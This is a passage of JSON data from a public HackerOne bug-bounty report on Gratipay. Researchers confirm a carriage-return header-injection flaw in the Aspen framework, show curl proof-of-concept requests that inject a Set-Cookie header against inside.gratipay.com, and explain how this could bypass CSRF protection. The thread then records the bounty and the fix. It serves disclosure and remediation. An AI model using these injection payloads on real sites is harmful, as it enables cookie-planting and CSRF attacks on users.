domain=.gratipay.com\nq:/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2016-07-18T14:53:45.221Z","updated_at":"2016-07-18T14:54:52.772Z","actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1073947,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Good call.\n\n@nashe_ Want to validate @valievkarim's finding? If it holds up I think we should reclassify as Moderate risk.","markdown_message":"\u003cp\u003eGood call.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/nashe_\"\u003e@nashe_\u003c/a\u003e Want to validate \u003ca href=\"/valievkarim\"\u003e@valievkarim\u003c/a\u003e\u0026#39;s finding? If it holds up I think we should reclassify as Moderate risk.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-18T15:05:44.693Z","updated_at":"2016-07-18T15:05:44.693Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1074845,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@whit537: Sure ;-) I'll try to re-do everything from scratch to be sure we don't miss anything.\n\n### CRLF injection is not impossible\n\nAspen 0.37 is [used by inside.gratipay.com since ~ 1 year](https://github.com/gratipay/inside.gratipay.com/commit/e986fef2c3a3477e41ac09f471c39f22fd55af8a). \nThe code which is protecting against CRLF injections [only checks the presence (or not)\nof a %0A](https://github.com/AspenWeb/pando.py/blob/0.37/aspen/http/baseheaders.py#L56).\n\nThis can be proved by enabling the `show_tracebacks` option and curl'ing it:\n\n```bash\ncurl 'http://localhost:8536/assets/%0a' -vv -c-\n* Connected to localhost (127.0.0.1) port 8536 (#0)\n\u003e GET /assets/%0a HTTP/1.1\n\u003e Host: localhost:8536\n\u003e User-Agent: curl/7.49.1\n\u003e Accept: */*\n\u003e\n—SNIP—\n        Bad request, program!\n        \u003cpre\u003ePossible CRLF Injection detected.\u003c/pre\u003e\n* Closing connection 0\n```\n\nBut the `%0d` injection is still possible (this display is due to the `%0d`, \"Carriage return\"):\n\n```bash\ncurl 'http://localhost:8536/assets/%0d' -vv -c-\n* Connected to localhost (127.0.0.1) port 8536 (#0)\n\u003e GET /assets/%0d HTTP/1.1\n\u003e Host: localhost:8536\n\u003e User-Agent: curl/7.49.1\n\u003e Accept: */*\n\u003e\n* HTTP 1.0, assume close after body\n\u003c HTTP/1.0 302 Found\n\u003c Date: Mon, 18 Jul 2016 20:27:38 GMT\n\u003c Server: WSGIServer/0.1 Python/2.7.11\n/ Location: /assets/\n\u003c\n* Closing connection 0\n```\n\n### curl PoC doesn't work…\n\nRegarding curl, I think the PoC is not working, no cookie is created (which would be the expected behaviour). To see this, just add the `-c-` option, forcing curl to use `stdout` as cookie jar:\n\n```bash\ncurl 'http://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0d' -vv -c-\n*   Trying 54.225.170.141...\n* Connected to inside.gratipay.com (54.225.170.141) port 80 (#0)\n\u003e GET /assets/%0dSet-Cookie:%20qwe=qwe%0d HTTP/1.1\n\u003e Host: inside.gratipay.com\n\u003e User-Agent: curl/7.49.1\n\u003e Accept: */*\n\u003e\n\u003c HTTP/1.1 302 Found\n\u003c Connection: close\n\u003c Date: Mon, 18 Jul 2016 18:40:13 GMT\n\u003c Server: WSGIServer/0.1 Python/2.7.11\n/et-Cookie: qwe=qwe/\n\u003c Via: 1.1 vegur\n\u003c\n* Closing connection 0\n```\n\nNothing! I guess that curl wants `%0a%0d` as separator.\n\n### …but CR injection can be exploited, sometimes\n\nHowever, I have to point out that [some browsers](http://image.slidesharecdn.com/smugglingsplittingpoisoningzeronightsonsec-111129060001-phpapp02/95/smuggling-splitting-poisoning-zeronights-onsec-7-728.jpg?cb=1322549289) (most especially old versions) are accepting `%0d` as header separator ([source](fr.slideshare.net/d0znpp/smuggling-splitting-poisoning-zeronights-onsec)). And nope, those browsers are not respecting [the RFC2616](https://www.w3.org/Protocols/rfc2616/rfc2616-sec6.html#sec6) :^)\n\nThis situation create a way to bypass our CSRF protection, by using `Set-cookie` to an arbitrary value and providing the same value for `csrf_token` over POST.  That's why #79552 was considered as valid (nice catch!).\n\n### Can inside.gratipay.com be used as pivot to set a cookie for gratipay.com?\n\n*(the weirdest part)*\n\nFrom [RFC2109](http://www.ietf.org/rfc/rfc2109.txt):\n\u003e    * A Set-Cookie from request-host y.x.foo.com for Domain=.foo.com would be rejected, because H is y.x and contains a dot.\n\u003e    * A Set-Cookie from request-host x.foo.com for Domain=.foo.com would be accepted.\n\nSince `.foo.com` is `foo.com` AND all the subdomains of `foo.com`, `inside.gratipay.com can set a cookie for `gratipay.com`. Hopefully, the RFC tells we can't create cookies for top-level domains (`.com`, etc). But there are some limitations, for examples for domains in `.co.uk`: if we follow the RFC, any user would be able to create cookies for all the `*.co.uk` websites… This led to the creation of [a list of public suffixes](https://publicsuffix.org/list/) that can't be used when defining cookies. ([Some good reading about this behaviour](http://bayou.io/draft/cookie.domain.html).)\n\n[Github published a very interesting post about how hard it is to let users host stuff on subdomains](https://github.com/blog/1466-yummy-cookies-across-domains). Spoil: they are using github.io for serving `gh-pages`.\n\n**TL;DR: Yep, it's a moderate risk for some weird/permissive/old browsers (good job @valievkarim!) and we need to use a newer version of aspen which is protecting against the CR injection.**","markdown_message":"\u003cp\u003e\u003ca href=\"/whit537\"\u003e@whit537\u003c/a\u003e: Sure ;-) I\u0026#39;ll try to re-do everything from scratch to be sure we don\u0026#39;t miss anything.\u003c/p\u003e\n\n\u003ch3 id=\"crlf-injection-is-not-impossible\"\u003eCRLF injection is not impossible\u003c/h3\u003e\n\n\u003cp\u003eAspen 0.37 is \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fgratipay%2Finside.gratipay.com%2Fcommit%2Fe986fef2c3a3477e41ac09f471c39f22fd55af8a\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eused by inside.gratipay.com since ~ 1 year\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. \u003cbr\u003e\nThe code which is protecting against CRLF injections \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FAspenWeb%2Fpando.py%2Fblob%2F0.37%2Faspen%2Fhttp%2Fbaseheaders.py%23L56\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eonly checks the presence (or not)\u003cbr\u003e\nof a %0A\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eThis can be proved by enabling the \u003ccode\u003eshow_tracebacks\u003c/code\u003e option and curl\u0026#39;ing it:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ecurl \u003cspan class=\"s1\"\u003e\u0026#39;http://localhost:8536/assets/%0a\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-vv\u003c/span\u003e \u003cspan class=\"nt\"\u003e-c-\u003c/span\u003e\n\u003cspan class=\"k\"\u003e*\u003c/span\u003e Connected to localhost \u003cspan class=\"o\"\u003e(\u003c/span\u003e127.0.0.1\u003cspan class=\"o\"\u003e)\u003c/span\u003e port 8536 \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"c\"\u003e#0)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e GET /assets/%0a HTTP/1.1\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e Host: localhost:8536\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e User-Agent: curl/7.49.1\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e Accept: \u003cspan class=\"k\"\u003e*\u003c/span\u003e/\u003cspan class=\"k\"\u003e*\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n—SNIP—\n        Bad request, program!\n        \u0026lt;pre\u0026gt;Possible CRLF Injection detected.\u0026lt;/pre\u0026gt;\n\u003cspan class=\"k\"\u003e*\u003c/span\u003e Closing connection 0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut the \u003ccode\u003e%0d\u003c/code\u003e injection is still possible (this display is due to the \u003ccode\u003e%0d\u003c/code\u003e, \u0026quot;Carriage return\u0026quot;):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ecurl \u003cspan class=\"s1\"\u003e\u0026#39;http://localhost:8536/assets/%0d\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-vv\u003c/span\u003e \u003cspan class=\"nt\"\u003e-c-\u003c/span\u003e\n\u003cspan class=\"k\"\u003e*\u003c/span\u003e Connected to localhost \u003cspan class=\"o\"\u003e(\u003c/span\u003e127.0.0.1\u003cspan class=\"o\"\u003e)\u003c/span\u003e port 8536 \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"c\"\u003e#0)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e GET /assets/%0d HTTP/1.1\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e Host: localhost:8536\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e User-Agent: curl/7.49.1\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e Accept: \u003cspan class=\"k\"\u003e*\u003c/span\u003e/\u003cspan class=\"k\"\u003e*\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"k\"\u003e*\u003c/span\u003e HTTP 1.0, assume close after body\n\u0026lt; HTTP/1.0 302 Found\n\u0026lt; Date: Mon, 18 Jul 2016 20:27:38 GMT\n\u0026lt; Server: WSGIServer/0.1 Python/2.7.11\n/ Location: /assets/\n\u0026lt;\n\u003cspan class=\"k\"\u003e*\u003c/span\u003e Closing connection 0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"curl-poc-doesn-t-work\"\u003ecurl PoC doesn\u0026#39;t work…\u003c/h3\u003e\n\n\u003cp\u003eRegarding curl, I think the PoC is not working, no cookie is created (which would be the expected behaviour). To see this, just add the \u003ccode\u003e-c-\u003c/code\u003e option, forcing curl to use \u003ccode\u003estdout\u003c/code\u003e as cookie jar:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ecurl \u003cspan class=\"s1\"\u003e\u0026#39;http://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0d\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-vv\u003c/span\u003e \u003cspan class=\"nt\"\u003e-c-\u003c/span\u003e\n\u003cspan class=\"k\"\u003e*\u003c/span\u003e   Trying 54.225.170.141...\n\u003cspan class=\"k\"\u003e*\u003c/span\u003e Connected to inside.gratipay.com \u003cspan class=\"o\"\u003e(\u003c/span\u003e54.225.170.141\u003cspan class=\"o\"\u003e)\u003c/span\u003e port 80 \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"c\"\u003e#0)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e GET /assets/%0dSet-Cookie:%20qwe\u003cspan class=\"o\"\u003e=\u003c/span\u003eqwe%0d HTTP/1.1\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e Host: inside.gratipay.com\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e User-Agent: curl/7.49.1\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e Accept: \u003cspan class=\"k\"\u003e*\u003c/span\u003e/\u003cspan class=\"k\"\u003e*\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u0026lt; HTTP/1.1 302 Found\n\u0026lt; Connection: close\n\u0026lt; Date: Mon, 18 Jul 2016 18:40:13 GMT\n\u0026lt; Server: WSGIServer/0.1 Python/2.7.11\n/et-Cookie: \u003cspan class=\"nv\"\u003eqwe\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eqwe/\n\u0026lt; Via: 1.1 vegur\n\u0026lt;\n\u003cspan class=\"k\"\u003e*\u003c/span\u003e Closing connection 0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNothing! I guess that curl wants \u003ccode\u003e%0a%0d\u003c/code\u003e as separator.\u003c/p\u003e\n\n\u003ch3 id=\"but-cr-injection-can-be-exploited-sometimes\"\u003e…but CR injection can be exploited, sometimes\u003c/h3\u003e\n\n\u003cp\u003eHowever, I have to point out that \u003ca href=\"/redirect?url=http%3A%2F%2Fimage.slidesharecdn.com%2Fsmugglingsplittingpoisoningzeronightsonsec-111129060001-phpapp02%2F95%2Fsmuggling-splitting-poisoning-zeronights-onsec-7-728.jpg%3Fcb%3D1322549289\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003esome browsers\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (most especially old versions) are accepting \u003ccode\u003e%0d\u003c/code\u003e as header separator (\u003ca href=\"/redirect?url=http%3A%2F%2Ffr.slideshare.net%2Fd0znpp%2Fsmuggling-splitting-poisoning-zeronights-onsec\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003esource\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e). And nope, those browsers are not respecting \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.w3.org%2FProtocols%2Frfc2616%2Frfc2616-sec6.html%23sec6\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ethe RFC2616\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e :^)\u003c/p\u003e\n\n\u003cp\u003eThis situation create a way to bypass our CSRF protection, by using \u003ccode\u003eSet-cookie\u003c/code\u003e to an arbitrary value and providing the same value for \u003ccode\u003ecsrf_token\u003c/code\u003e over POST.  That\u0026#39;s why \u003ca href=\"/reports/79552\"\u003e#79552\u003c/a\u003e was considered as valid (nice catch!).\u003c/p\u003e\n\n\u003ch3 id=\"can-inside-gratipay-com-be-used-as-pivot-to-set-a-cookie-for-gratipay-com\"\u003eCan inside.gratipay.com be used as pivot to set a cookie for gratipay.com?\u003c/h3\u003e\n\n\u003cp\u003e\u003cem\u003e(the weirdest part)\u003c/em\u003e\u003c/p\u003e\n\n\u003cp\u003eFrom \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.ietf.org%2Frfc%2Frfc2109.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eRFC2109\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cul\u003e\n\u003cli\u003eA Set-Cookie from request-host y.x.foo.com for Domain=.foo.com would be rejected, because H is y.x and contains a dot.\u003c/li\u003e\n\u003cli\u003eA Set-Cookie from request-host x.foo.com for Domain=.foo.com would be accepted.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eSince \u003ccode\u003e.foo.com\u003c/code\u003e is \u003ccode\u003efoo.com\u003c/code\u003e AND all the subdomains of \u003ccode\u003efoo.com\u003c/code\u003e, \u003ccode\u003einside.gratipay.com can set a cookie for\u003c/code\u003egratipay.com\u003ccode\u003e. Hopefully, the RFC tells we can\u0026#39;t create cookies for top-level domains (\u003c/code\u003e.com\u003ccode\u003e, etc). But there are some limitations, for examples for domains in\u003c/code\u003e.co.uk\u003ccode\u003e: if we follow the RFC, any user would be able to create cookies for all the\u003c/code\u003e*.co.uk` websites… This led to the creation of \u003ca href=\"/redirect?url=https%3A%2F%2Fpublicsuffix.org%2Flist%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ea list of public suffixes\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e that can\u0026#39;t be used when defining cookies. (\u003ca href=\"/redirect?url=http%3A%2F%2Fbayou.io%2Fdraft%2Fcookie.domain.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eSome good reading about this behaviour\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.)\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fblog%2F1466-yummy-cookies-across-domains\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eGithub published a very interesting post about how hard it is to let users host stuff on subdomains\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Spoil: they are using github.io for serving \u003ccode\u003egh-pages\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eTL;DR: Yep, it\u0026#39;s a moderate risk for some weird/permissive/old browsers (good job \u003ca href=\"/valievkarim\"\u003e@valievkarim\u003c/a\u003e!) and we need to use a newer version of aspen which is protecting against the CR injection.\u003c/strong\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-18T21:45:32.022Z","updated_at":"2016-07-18T21:47:00.539Z","actor":{"username":"nashe_","cleared":false,"url":"/nashe_","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1074870,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@nashe_, thanks, you are completely right, except that CR injection is exploitable not only in old browsers, but in any IE, including IE11. And it's IE11 on my screenshot in the original report.\nAnd yes, It doesn't work in curl. I use curl just to fast-check the existence of the bug: CR is shown as '^M' in 'less' output.","markdown_message":"\u003cp\u003e\u003ca href=\"/nashe_\"\u003e@nashe_\u003c/a\u003e, thanks, you are completely right, except that CR injection is exploitable not only in old browsers, but in any IE, including IE11. And it\u0026#39;s IE11 on my screenshot in the original report.\u003cbr\u003e\nAnd yes, It doesn\u0026#39;t work in curl. I use curl just to fast-check the existence of the bug: CR is shown as \u0026#39;^M\u0026#39; in \u0026#39;less\u0026#39; output.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-18T22:00:48.199Z","updated_at":"2016-07-18T22:00:48.199Z","actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1074885,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"By the way, in my message, `s/CRLF injection is not impossible/CRLF injection is not possible/`. And I just saw that I omitted a `, but I can't edit it anymore, sorry.\n\nOK, thanks for the precision about IE! I don't have any IE to try this but that would not be the first time a RFC is not respected. \n\nWe'll try to fix the issue ASAP, sorry for the delay!","markdown_message":"\u003cp\u003eBy the way, in my message, \u003ccode\u003es/CRLF injection is not impossible/CRLF injection is not possible/\u003c/code\u003e. And I just saw that I omitted a `, but I can\u0026#39;t edit it anymore, sorry.\u003c/p\u003e\n\n\u003cp\u003eOK, thanks for the precision about IE! I don\u0026#39;t have any IE to try this but that would not be the first time a RFC is not respected. \u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ll try to fix the issue ASAP, sorry for the delay!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-18T22:08:03.655Z","updated_at":"2016-07-18T22:08:03.655Z","actor":{"username":"nashe_","cleared":false,"url":"/nashe_","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1076126,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Awesome work, @nashe_, thank you! And thanks for the report, @valievkarim.","markdown_message":"\u003cp\u003eAwesome work, \u003ca href=\"/nashe_\"\u003e@nashe_\u003c/a\u003e, thank you! And thanks for the report, \u003ca href=\"/valievkarim\"\u003e@valievkarim\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-19T15:55:32.452Z","updated_at":"2016-07-19T15:55:32.452Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1076129,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Additional $39 to total $40 for a moderate risk per our [program](https://hackerone.com/gratipay).","markdown_message":"\u003cp\u003eAdditional $39 to total $40 for a moderate risk per our \u003ca href=\"https://hackerone.com/gratipay\"\u003eprogram\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-19T15:56:23.051Z","updated_at":"2016-07-19T15:56:23.051Z","actor":{"url":"/gratipay","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Gratipay"}},"bounty_amount":"39.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"gratipay","collaborator":{"username":"valievkarim","url":"/valievkarim"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1079470,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you!","markdown_message":"\u003cp\u003eThank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-21T07:29:50.489Z","updated_at":"2016-07-21T07:29:50.489Z","actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1132273,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"[Issue was opened](https://github.com/gratipay/inside.gratipay.com/issues/766) regarding this report.","markdown_message":"\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fgratipay%2Finside.gratipay.com%2Fissues%2F766\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eIssue was opened\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e regarding this report.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-17T16:49:57.358Z","updated_at":"2016-08-17T16:49:57.358Z","actor":{"username":"nashe_","cleared":false,"url":"/nashe_","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1326584,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-11-29T15:55:34.907Z","updated_at":"2016-11-29T15:55:34.907Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":10146},"actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1495789,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Done in https://github.com/gratipay/inside.gratipay.com/pull/788!","markdown_message":"\u003cp\u003eDone in \u003ca title=\"https://github.com/gratipay/inside.gratipay.com/pull/788\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fgratipay%2Finside.gratipay.com%2Fpull%2F788\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/gratipay/inside.gratipay.com/pull/788\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-20T22:20:06.248Z","updated_at":"2017-02-20T22:20:06.248Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"valievkarim","url":"/valievkarim"},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1495799,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-20T22:31:09.618Z","updated_at":"2017-02-20T22:31:09.618Z","first_to_agree":true,"actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1558351,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-22T22:31:09.801Z","updated_at":"2017-03-22T22:31:09.801Z","actor":{"url":"/gratipay","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Gratipay"}},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}